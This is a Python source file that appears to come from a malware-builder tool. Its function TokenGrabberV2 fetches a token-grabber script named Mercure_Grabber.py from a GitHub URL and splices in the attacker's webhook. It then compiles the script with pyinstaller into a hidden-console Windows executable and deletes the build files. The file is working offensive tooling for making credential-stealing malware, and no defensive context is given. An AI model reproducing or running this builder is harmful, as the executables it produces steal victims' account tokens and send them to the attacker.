from assets import *

def TokenGrabberV2(WebHook, fileName):
    code_url = "https://raw.githubusercontent.com/lostingcord/Mercure-Grabbeur/main/Mercure_Grabber.py"
    code = requests.get(code_url).text.replace("WEBHOOK_HERE", WebHook)

    with open(f"{fileName}.py", 'w', encoding='utf8', errors="ignore") as f:
        f.write(code)

    print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
    os.system(f"pyinstaller --onefile --noconsole {fileName}.py")

    try:
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
        os.remove(f'{fileName}.spec')
        os.remove(f'{fileName}.py')
    except FileNotFoundError:
        pass

    print(f"\n{Fore.RED}File created as {fileName}.exe\n")
    input(f'{Fore.RED}[?]{Fore.RESET} [Enter Anything to continue] > ')